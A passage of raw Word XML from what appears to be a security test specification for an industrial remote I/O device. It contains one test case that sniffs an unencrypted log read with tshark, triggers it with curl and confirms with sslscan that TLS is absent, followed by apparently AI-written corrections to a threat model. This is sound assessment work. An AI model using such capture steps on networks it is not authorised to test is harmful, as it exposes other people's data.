            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="14D70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3D696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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8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C2DD5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lang w:val="en-US"/>
              </w:rPr>
              <w:t>1. Trigger a legitimate log read. 2. Passively capture the exchange on the mirror. 3. Extract the cleartext log content from the payload. 4. Confirm no HTTPS endpoint is available.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="3AACD9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A403B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Pass/Fail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ECD76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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> log transport is encrypted. </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> cleartext log recoverable + no TLS (SRIO-7907) → confirms CR 4.1/4.3 non-conformity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1430F31A" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execution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671"/>
      </w:tblGrid>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="6CC3CD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EAE10C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85078" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="33A75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0AE41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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A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9B0FB" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TC-RQ014-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="43CF0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C5280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t>HW/Network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85D1D0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r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">DUT 192.168.0.2; laptop mirror NIC (Wireshark, no IP); read triggered </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>from Pi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="5C302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D08F2" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>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D1DE1" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>tshark</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/Wireshark (passive), </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>sslscan</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (per </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> CM-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="52784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09F26" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Commands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64B6D" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B4F5420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># TC-RQ014-02 Passive cleartext capture of the tracing-log read + confirm no TLS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5B341A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># (laptop mirror)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEAB99E" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> eth0 -Y 'http &amp;&amp; frame contains "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>errorlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"' -w TC1402_log_http.pcapng &amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDF92A7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># (trigger from Pi)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6509E99B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 xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId354" w:history="1">
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4853D073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># confirm no HTTPS endpoint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5270B041" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sslscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.0.2:443 | tee TC1402_tls.txt # expect: no TLS / connection refused</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48269DB5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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Cleartext log content visible in the PCAP; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sslscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> finds no TLS (SRIO-7907). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Cleartext log captured ☐ No HTTPS available (CR 4.1/4.3 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1402_log_http.pcapng (highlighted log content), TC1402_tls.txt | </w:t>
      </w:r>
      <w:hyperlink r:id="rId355" w:history="1">
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0C7CF868" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="00000000" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="2FDCA5A1">
          <v:rect id="_x0000_i1114" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="3152647B" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of My Corrections to Your Input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E58D16" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset-label error:</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> your "</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset F = unauthenticated cleartext exposure channel</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>" contradicts your master table (</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset F = Domain Separation</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). Re-label the exposure channel to </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset H / IoT-Core service</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; retain Asset F only as the "log-lives-on-QM-COM" note. </w:t>
      </w:r>
      <w:hyperlink r:id="rId356" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41626CFE" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Mapping root cause added:</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> include </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 1.1/1.2</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — access cannot be </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>restricted to a party</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on a device that </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot identify any party</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (password dropped, SRIO-8299). CR 2.1 is inoperable </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>because</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> CR 1.1/1.2 are absent. Add </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 4.3</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the cleartext channel. </w:t>
      </w:r>
      <w:hyperlink r:id="rId357" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId358" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="77FC2A9B" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE refinement:</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> your "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">" is better described as**"missing authorization boundary"** (no gate to </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>escalate</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> past); add a </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering/lifecycle</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> note for the absent delete/erase command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFB7073" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The paradox (G-4) — your analytical </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>centrepiece</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-014 and RQ-012/013 fail for the </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>same</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> design choice in </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>opposite</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> directions — the QM buffer is </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>too volatile to retain</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>too open to restrict</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>One decision breaks the whole audit cluster.</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Foreground this in your </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>defence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId359" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0C15B43D" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="00000000" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="3ECAE735">
          <v:rect id="_x0000_i1115" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B02E13" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>🎯</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
